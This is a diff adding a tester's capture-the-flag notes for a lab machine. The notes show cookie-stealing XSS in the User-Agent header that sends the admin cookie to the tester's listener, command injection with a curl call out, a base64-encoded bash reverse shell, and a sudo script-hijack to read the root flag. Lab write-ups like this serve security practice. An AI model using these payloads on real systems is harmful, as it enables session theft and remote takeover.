@@ -6,7 +6,45 @@ headless
 		server is python flask?
 		request sets an interesting cookie
 			Set-Cookie is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_Zfs; Path=/
+
+		there's /dashboard that gives 500
 	
 		the form actually sends requests
 			POST http://10.10.11.8:5000/support
 			fname=qwe&lname=qwe&email=qwe%40qwe.qwe&phone=213&message=23
+			
+			not sql injectable (sqlmap)
+			not command injectable
+
+			xss-injectable by putting <script></script> into &message
+		
+			the report will be sent to admins, so the admin will view it?
+
+			the request is rejected if message field has both > and < in any position
+
+			pure js like fetch('http://IP:8003/')//';//""' can be injected but does nothing
+
+			putting <script>fetch('http://IP:8003/')</script> into user-agent header worked
+
+			by sending User-Agent: <script>fetch(`http://IP:3000/${document.cookie}`)</script>
+			and intercepting it with a node.js http.createServer we stole the admin cookie
+				is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+
+			the dashboard request is vulnerable to command injection:
+				date=;curl http://10.10.14.13:3000
+
+			getting in with echo${IFS}YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy80NDQ0ICAwPiYxIA==|base64${IFS}-d|bash
+				gives user flag
+
+			sudo -l shows /usr/bin/syscheck can be run as root
+			syscheck calls some initdb.sh
+
+			cd / && find -name initdb.sh 2> /dev/null
+				doesn't find anything
+
+			cd && "cat /root/root.txt" > ./initdb.sh && chmod +x ./initdb.sh
+			sudo /usr/bin/syscheck
+
+				gives root flag
+
+				gg
